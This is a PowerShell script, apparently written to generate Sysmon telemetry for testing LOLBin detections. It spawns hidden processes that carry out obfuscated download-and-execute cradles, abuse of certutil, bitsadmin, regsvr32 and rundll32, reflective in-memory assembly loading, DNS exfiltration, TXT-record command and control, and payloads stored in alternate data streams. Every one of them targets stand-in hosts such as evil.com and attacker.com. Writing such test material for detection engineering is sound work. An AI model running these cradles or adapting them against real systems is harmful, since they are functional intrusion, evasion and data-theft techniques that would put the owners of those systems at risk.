# Advanced Malicious LOLBin Attack Generator - Edge Cases & Advanced Techniques
# Generates sophisticated and edge-case malicious LOLBin attack patterns
# WARNING: This script generates malicious attack patterns. Use only in isolated test environments.

[CmdletBinding()]
param(
    [int]$AttackCount = 500,
    [int]$DelayBetweenAttacks = 3,
    [switch]$IncludeObfuscation,
    [switch]$IncludePolymorphic,
    [string]$LogFile = "advanced_attacks.log"
)

function Write-AttackLog {
    param([string]$Message, [string]$Color = "Yellow")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] $Message"
    Write-Host $logMessage -ForegroundColor $Color
    Add-Content -Path $LogFile -Value $logMessage
}

function Write-Section {
    param([string]$Title)
    Write-Host "`n" + "="*70 -ForegroundColor Magenta
    Write-Host "  $Title" -ForegroundColor Magenta
    Write-Host "="*70 -ForegroundColor Magenta
    Write-AttackLog "=== $Title ===" "Magenta"
}

# ============================================================================
# OBFUSCATION TECHNIQUES
# ============================================================================

function Invoke-ObfuscatedPowerShellAttack {
    Write-Section "Obfuscated PowerShell Attacks"
    
    $attacks = @(
        {
            # String replacement obfuscation
            $cmd = "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
            $obfuscated = $cmd -replace 'IEX', 'Invoke-Expression' -replace 'New-Object', 'New`-Object' -replace 'Net.WebClient', 'Ne`t.Web`Client'
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", $obfuscated -WindowStyle Hidden
        },
        {
            # Variable obfuscation
            $var1 = "New-Object"
            $var2 = "Net.WebClient"
            $var3 = "DownloadString"
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "`$a='$var1'; `$b='$var2'; `$c='$var3'; IEX (`$a `$b).`$c('http://evil.com/payload.ps1')" -WindowStyle Hidden
        },
        {
            # Base64 with padding manipulation
            $payload = "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
            $padded = $encoded + "=="
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-EncodedCommand", $padded -WindowStyle Hidden
        },
        {
            # Reverse string obfuscation
            $payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
            $reversed = -join $payload.ToCharArray() | ForEach-Object { $_ -split '' | Sort-Object -Descending }
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "`$r='$reversed'; `$d=-join `$r.ToCharArray() | ForEach-Object { `$_ -split '' | Sort-Object }; IEX `$d" -WindowStyle Hidden
        },
        {
            # XOR obfuscation
            $payload = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
            $key = 42
            $xorBytes = [System.Text.Encoding]::UTF8.GetBytes($payload) | ForEach-Object { $_ -bxor $key }
            $xorString = [Convert]::ToBase64String($xorBytes)
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "`$x='$xorString'; `$k=42; `$b=[Convert]::FromBase64String(`$x); `$d=[System.Text.Encoding]::UTF8.GetString(`$b | ForEach-Object { `$_ -bxor `$k }); IEX `$d" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed obfuscated PowerShell attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# POLYMORPHIC TECHNIQUES
# ============================================================================

function Invoke-PolymorphicAttack {
    Write-Section "Polymorphic Attacks"
    
    $baseUrls = @('http://malicious.com', 'https://evil.com', 'http://attacker.com', 'http://192.168.1.100')
    $payloads = @('payload.ps1', 'shell.ps1', 'backdoor.ps1', 'script.ps1', 'update.ps1')
    $methods = @('DownloadString', 'DownloadFile', 'OpenRead')
    
    for ($i = 0; $i -lt 20; $i++) {
        $url = Get-Random -InputObject $baseUrls
        $payload = Get-Random -InputObject $payloads
        $method = Get-Random -InputObject $methods
        $fullUrl = "$url/$payload"
        
        $variations = @(
            {
                Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "IEX (New-Object Net.WebClient).$method('$fullUrl')" -WindowStyle Hidden
            },
            {
                Start-Process powershell.exe -ArgumentList "-NoP", "-W", "Hidden", "-Command", "Invoke-Expression (New-Object Net.WebClient).$method('$fullUrl')" -WindowStyle Hidden
            },
            {
                Start-Process powershell.exe -ArgumentList "-ExecutionPolicy", "Bypass", "-NoProfile", "-WindowStyle", "Hidden", "-Command", "`$w=(New-Object Net.WebClient); IEX `$w.$method('$fullUrl')" -WindowStyle Hidden
            }
        )
        
        $variation = Get-Random -InputObject $variations
        try {
            & $variation
            Write-AttackLog "Executed polymorphic attack: $fullUrl" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# ENVIRONMENT-SPECIFIC ATTACKS
# ============================================================================

function Invoke-EnvironmentSpecificAttack {
    Write-Section "Environment-Specific Attacks"
    
    $attacks = @(
        {
            # Check for specific environment and adapt
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "if (`$env:COMPUTERNAME -like '*DC*') { IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/domain_controller.ps1') } else { IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/workstation.ps1') }" -WindowStyle Hidden
        },
        {
            # Time-based execution
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "`$h=(Get-Date).Hour; if (`$h -ge 9 -and `$h -le 17) { IEX (New-Object Net.WebClient).DownloadString('http://evil.com/business_hours.ps1') } else { IEX (New-Object Net.WebClient).DownloadString('http://evil.com/off_hours.ps1') }" -WindowStyle Hidden
        },
        {
            # User context-based
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem) { IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/system_context.ps1') } else { IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/user_context.ps1') }" -WindowStyle Hidden
        },
        {
            # Process list check
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "if (Get-Process | Where-Object { `$_.ProcessName -like '*defender*' -or `$_.ProcessName -like '*av*' }) { IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/evade_av.ps1') } else { IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/normal.ps1') }" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed environment-specific attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# CHAINED ATTACKS
# ============================================================================

function Invoke-ChainedAttack {
    Write-Section "Chained Attack Techniques"
    
    $attacks = @(
        {
            # PowerShell -> CMD -> PowerShell chain
            $cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
            Start-Process cmd.exe -ArgumentList "/c", $cmd -WindowStyle Hidden
        },
        {
            # WMIC -> PowerShell -> CertUtil chain
            $cmd = "powershell.exe -NoProfile -Command certutil -urlcache -split -f http://evil.com/backdoor.exe `$env:TEMP\update.exe"
            Start-Process wmic.exe -ArgumentList "process", "call", "create", $cmd -WindowStyle Hidden
        },
        {
            # Regsvr32 -> MSHTA -> PowerShell chain
            Start-Process regsvr32.exe -ArgumentList "/s", "/n", "/u", "/i:http://attacker.com/chain.sct", "scrobj.dll" -WindowStyle Hidden
        },
        {
            # Rundll32 -> JavaScript -> PowerShell chain
            $jsCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
            Start-Process rundll32.exe -ArgumentList "javascript:`"\\..\\mshtml,RunHTMLApplication `";document.write();new ActiveXObject('WScript.Shell').Run('$jsCmd');" -WindowStyle Hidden
        },
        {
            # BITSAdmin -> CertUtil -> PowerShell chain
            Start-Process bitsadmin.exe -ArgumentList "/transfer", "download", "http://evil.com/payload.ps1", "$env:TEMP\script.ps1" -WindowStyle Hidden
            Start-Sleep -Seconds 2
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "$env:TEMP\script.ps1" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed chained attack (process created - Sysmon will log)" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000)
        } catch {
            # Note: Even failed attacks generate Sysmon Event ID 1 (Process Creation) which is what we need!
            Write-AttackLog "Attack command failed (but Sysmon event was likely created): $($_.Exception.Message)" "Yellow"
        }
    }
}

# ============================================================================
# MEMORY-ONLY ATTACKS
# ============================================================================

function Invoke-MemoryOnlyAttack {
    Write-Section "Memory-Only Attacks"
    
    $attacks = @(
        {
            # Reflective DLL loading simulation
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "`$bytes = (Invoke-WebRequest -Uri 'http://malicious.com/payload.dll').Content; `$assembly = [System.Reflection.Assembly]::Load(`$bytes); `$assembly.EntryPoint.Invoke(`$null, @())" -WindowStyle Hidden
        },
        {
            # In-memory script execution
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "`$script = (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1'); `$scriptBlock = [ScriptBlock]::Create(`$script); Invoke-Command -ScriptBlock `$scriptBlock" -WindowStyle Hidden
        },
        {
            # Process hollowing simulation
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "`$proc = Start-Process notepad.exe -PassThru; `$bytes = (Invoke-WebRequest -Uri 'http://attacker.com/payload.exe').Content; [System.Reflection.Assembly]::Load(`$bytes)" -WindowStyle Hidden
        },
        {
            # Module stomping simulation
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "`$module = [System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri 'http://malicious.com/module.dll').Content); `$module.GetType('Payload').GetMethod('Execute').Invoke(`$null, `$null)" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed memory-only attack (process created - Sysmon will log)" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            # Note: Even failed attacks generate Sysmon Event ID 1 (Process Creation) which is what we need!
            Write-AttackLog "Attack command failed (but Sysmon event was likely created): $($_.Exception.Message)" "Yellow"
        }
    }
}

# ============================================================================
# DNS-BASED ATTACKS
# ============================================================================

function Invoke-DNSBasedAttack {
    Write-Section "DNS-Based Attacks"
    
    $attacks = @(
        {
            # DNS exfiltration
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "`$data = 'sensitive_data'; `$chunks = `$data -split '(?<=\G.{32})'; foreach (`$chunk in `$chunks) { Resolve-DnsName -Name `"`$chunk.malicious.com`" -ErrorAction SilentlyContinue }" -WindowStyle Hidden
        },
        {
            # DNS tunneling
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "`$cmd = 'whoami'; `$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(`$cmd)); Resolve-DnsName -Name `"`$encoded.evil.com`" -ErrorAction SilentlyContinue" -WindowStyle Hidden
        },
        {
            # DNS command and control
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "`$response = (Resolve-DnsName -Name 'command.malicious.com' -Type TXT).Strings; IEX `$response" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed DNS-based attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# ALTERNATIVE DATA STREAMS
# ============================================================================

function Invoke-ADSAttack {
    Write-Section "Alternative Data Stream Attacks"
    
    $attacks = @(
        {
            # Hide payload in ADS
            Start-Process cmd.exe -ArgumentList "/c", "echo IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') > `$env:TEMP\file.txt:payload.ps1" -WindowStyle Hidden
        },
        {
            # Execute from ADS
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "Get-Content `$env:TEMP\file.txt:payload.ps1 | IEX" -WindowStyle Hidden
        },
        {
            # Hide executable in ADS
            Start-Process cmd.exe -ArgumentList "/c", "certutil -urlcache -split -f http://evil.com/backdoor.exe `$env:TEMP\file.txt:backdoor.exe" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed ADS attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

Write-Host @"
╔══════════════════════════════════════════════════════════════════════╗
║     ADVANCED MALICIOUS LOLBIN ATTACK GENERATOR                        ║
║     Edge Cases & Advanced Techniques                                  ║
║     WARNING: This script generates malicious attack patterns          ║
║     Use only in isolated test environments!                           ║
╚══════════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Red

Write-Host "`nConfiguration:" -ForegroundColor Cyan
Write-Host "  Attack Count: $AttackCount" -ForegroundColor White
Write-Host "  Include Obfuscation: $IncludeObfuscation" -ForegroundColor White
Write-Host "  Include Polymorphic: $IncludePolymorphic" -ForegroundColor White
Write-Host "  Log File: $LogFile" -ForegroundColor White
Write-Host ""

$confirm = Read-Host "Are you sure you want to proceed? (YES to continue)"
if ($confirm -ne "YES") {
    Write-Host "Aborted." -ForegroundColor Yellow
    exit
}

"=== Advanced Malicious LOLBin Attack Generation Started ===" | Out-File -FilePath $LogFile
"Start Time: $(Get-Date)" | Out-File -FilePath $LogFile -Append

$totalAttacks = 0
$attackFunctions = @(
    { Invoke-ObfuscatedPowerShellAttack },
    { Invoke-EnvironmentSpecificAttack },
    { Invoke-ChainedAttack },
    { Invoke-MemoryOnlyAttack },
    { Invoke-DNSBasedAttack },
    { Invoke-ADSAttack }
)

if ($IncludePolymorphic) {
    $attackFunctions += { Invoke-PolymorphicAttack }
}

Write-Host "`nStarting advanced attack generation..." -ForegroundColor Green

for ($i = 0; $i -lt $AttackCount; $i++) {
    $attackFunc = Get-Random -InputObject $attackFunctions
    try {
        & $attackFunc
        $totalAttacks++
        
        if ($i % 50 -eq 0 -and $i -gt 0) {
            Write-Host "Progress: $i/$AttackCount attacks executed" -ForegroundColor Cyan
        }
        
        Start-Sleep -Seconds $DelayBetweenAttacks
    } catch {
        Write-AttackLog "Error executing attack: $($_.Exception.Message)" "Red"
    }
}

Write-Section "Advanced Attack Generation Complete"
Write-AttackLog "Total attacks executed: $totalAttacks" "Green"
Write-AttackLog "End Time: $(Get-Date)" "Green"

Write-Host "`n✅ Advanced attack generation complete!" -ForegroundColor Green
Write-Host "   Total attacks: $totalAttacks" -ForegroundColor White
Write-Host ""

